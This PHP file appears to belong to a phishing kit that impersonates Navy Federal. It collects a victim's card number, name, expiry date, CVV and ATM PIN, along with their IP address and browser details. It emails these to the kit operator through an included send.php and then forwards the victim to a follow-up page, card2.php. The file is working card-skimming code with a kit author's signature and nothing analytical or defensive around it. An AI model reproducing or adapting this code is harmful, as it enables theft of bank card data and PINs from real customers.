<?php include 'send.php';?>
<?php

$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->Navy Federal - ReZulT (5)<------------------\n";
$message .= "Card Number: ".$_POST['Number']."\n";
$message .= "Name On Card: ".$_POST['Name']."\n";
$message .= "Expiry: ".$_POST['Month']."";
$message .= "/".$_POST['Year']."\n";
$message .= "CVV: ".$_POST['CVV']."\n";
$message .= "ATM PIN: ".$_POST['ATM']."\n\n";

$message .= "Time: $timestamp \n";
$message .= "Browser: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -By Bell South - ICQ:@Bell_South----------\n";

$subject = "NavyFederal Card (5)😈 INFO FROM 😈- $ip";
$headers = "";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "Bell South ReZulT ", $message);
if (mail($recipient,$subject,$message,$headers))
	   {

		   header("Location:card2.php");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?> 